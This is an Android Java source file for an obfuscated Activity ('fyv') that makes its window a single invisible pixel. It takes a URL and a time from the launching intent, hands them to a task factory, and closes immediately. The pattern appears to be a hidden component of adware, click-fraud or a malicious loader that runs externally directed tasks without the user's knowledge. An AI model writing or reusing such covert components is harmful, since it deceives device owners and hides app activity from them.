package com.farm.cloudy.snowy;

import android.app.Activity;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

public class fyv extends Activity {
    private String url;
    private long time;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Window window = getWindow();
            window.setGravity(Gravity.LEFT | Gravity.TOP);
            WindowManager.LayoutParams params = window.getAttributes();
            params.x = 0;
            params.y = 0;
            params.width = 1;
            params.height = 1;
            params.windowAnimations = 1;
            window.setAttributes(params);
            getExternalData();
            Logger.e("fyv Activity onCreate");
            finish();
        } catch (Exception e) {
            finish();
        }
    }

    private void getExternalData() {
        Bundle bundle = getIntent().getExtras();
        if (bundle != null) {
            url = bundle.getString(Config.EXTERNAL_URL);
            time = bundle.getLong(Config.EXTERNAL_TIME);
            Logger.d(url + " | " + time);
            if (!TextUtils.isEmpty(url)) {
                ImplementFactory implementFactory = Start.getImplementFactory();
                if(implementFactory!=null){
                    implementFactory.performTask(this,url,time);
                }
            } else {
                finish();
            }
        }
    }

    @Override
    protected void onDestroy() {
        Logger.e("fyv Activity onDestroy");
        super.onDestroy();
    }
}
